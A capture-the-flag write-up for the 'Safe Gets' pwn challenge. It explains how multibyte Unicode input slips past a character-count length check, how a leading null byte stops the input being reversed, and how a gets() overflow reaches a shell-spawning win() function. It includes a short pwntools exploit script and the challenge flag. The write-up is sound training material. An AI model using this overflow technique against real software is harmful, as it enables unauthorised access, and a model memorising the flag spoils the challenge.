# Safe Gets

## Challenge Summary  

- **Category**: Pwn  
- **Points**: 50  
- **Solves**: 162 teams

---

### Problem Description  

> I think I found a way to make gets safe.

---

## Challenge Structure  

- The wrapper.py limits input length using `len()` to 0xff (255 characters)  
- However, using multibyte Unicode characters, the byte length can exceed this limit while character count stays within it → allows bypassing input length check  
- The input string is reversed based on `strlen()` length  
- `gets()` is used, allowing buffer overflow (BOF)  
- There is a `win()` function calling `system("/bin/sh")`  
- The input string is reversed, so this must be handled carefully

---

### Protections

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

---

## Exploitation Flow

### Step 1: Bypass wrapper.py input length check using Unicode characters  

```python
MAX_LEN = 0xff

payload = input(f"Enter your input (max {MAX_LEN} bytes): ")
if len(payload) > MAX_LEN:
    print("[-] Input too long!")
    sys.exit(1)
```

- The wrapper checks input length with `len(payload)` which counts characters (max 255)  
- UTF-8 multibyte characters consist of multiple bytes per character  
- This allows sending payloads with actual byte length exceeding 255 while character count remains below 255  
- This bypass leads to buffer overflow

---

### Step 2: Bypass input reversing

```c
sVar1 = strlen(local_118);
local_14 = (int)sVar1;

for (local_10 = 0; local_10 < (ulong)(long)(local_14 / 2); local_10 = local_10 + 1) {
    local_15 = local_118[(long)(local_14 - 1) - local_10];
    local_118[(long)(local_14 - 1) - local_10] = local_118[local_10];
    local_118[local_10] = local_15;
}
```

- The string length is computed using `strlen()` and stored in `local_14`  
- The loop reverses the string by swapping characters up to half the length  
- If the first byte is `\x00`, `strlen()` returns 0, so the loop doesn't run  
- This prevents the input from being reversed, preserving the exploit payload intact

---

### Step 3: Exploit script

```python
rop = ROP(elf)
rop.raw(b"\\x00" + b"\\xef\\xbc\\xa1" * 0x5d)
rop.raw(rop.ret)
rop.raw(elf.sym.win)
r.sendlineafter(": ", rop.chain())
r.interactive()
```

- `\x00` prepended to disable reversing  
- `\xef\xbc\xa1` is a multibyte Unicode character repeated for padding to bypass length check  
- Padding + `ret` + `win()` call structure  
- PIE disabled, so `win` address is fixed

---

## Flag

```bash
$ cat flag.txt
L3AK{6375_15_4pp4r3n7ly_n3v3r_54f3}
```
